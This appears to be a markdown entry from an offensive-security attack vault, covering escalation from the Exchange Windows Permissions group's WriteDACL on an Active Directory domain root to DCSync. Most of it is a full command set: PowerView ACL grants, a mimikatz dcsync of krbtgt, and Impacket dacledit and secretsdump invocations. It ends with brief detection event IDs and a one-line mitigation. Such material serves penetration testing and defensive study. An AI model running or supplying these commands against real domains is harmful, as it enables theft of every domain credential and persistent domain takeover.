---
title: "Attack #53 — Exchange Windows Permissions (WriteDACL to DCSync)"
description: "In many environments, the Exchange Windows Permissions security group has WriteDACL on the domain root object. This is a well-known legacy…"
category: active-directory
tags: ["active-directory", "credential-access"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #53 — Exchange Windows Permissions (WriteDACL to DCSync).md"
---
# 🟣 Attack #53 — Exchange Windows Permissions (WriteDACL → DCSync)

***

## 📖 How It Works

In many environments, the **Exchange Windows Permissions** security group has **WriteDACL** on the domain root object. This is a well-known legacy misconfiguration from Exchange Server installation. Any member of this group (or anyone who compromises a member) can grant themselves DCSync rights and extract every credential in the domain.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Membership in Exchange Windows Permissions** | Or compromise of a member |
| **WriteDACL on domain root** | Default after Exchange installation |

***

## 💻 Full Commands

```powershell
# ── Check if Exchange Windows Permissions has WriteDACL on domain ─────────────
Get-ObjectAcl "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
  $_.IdentityReference -match "Exchange Windows Permissions"
} | Select-Object ActiveDirectoryRights

# ── Grant DCSync rights ──────────────────────────────────────────────────────
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity compromised_exchange_user -Rights DCSync

# ── DCSync ────────────────────────────────────────────────────────────────────
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

```bash
# ── Linux ─────────────────────────────────────────────────────────────────────
dacledit.py -action write -rights DCSync \
  -principal compromised_user -target-dn "DC=corp,DC=local" \
  corp.local/compromised_user:'Password1' -dc-ip 10.10.10.10

secretsdump.py corp.local/compromised_user:'Password1'@DC01.corp.local \
  -just-dc-user krbtgt
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5136** | Security Log (DC) | DACL modification on domain root object |
| **4662** | Security Log (DC) | Replication rights used |

***

## 🔗 Attack Chain Context

```
[Exchange Permissions] ──→ WriteDACL on domain root → DCSync
         │
         ├──→ 🔗 Compromise Exchange admin → WriteDACL → DCSync → Golden Ticket
         ├──→ 📋 Legacy misconfiguration from Exchange Server setup
         └──→ 💀 Defeated by: remove WriteDACL from Exchange groups, audit domain ACLs
```

***

> ✅ **Attack #53 — Exchange Windows Permissions complete.**

***

> 🏁 **Category 6 — Privilege Escalation is now COMPLETE (9/9 attacks).**
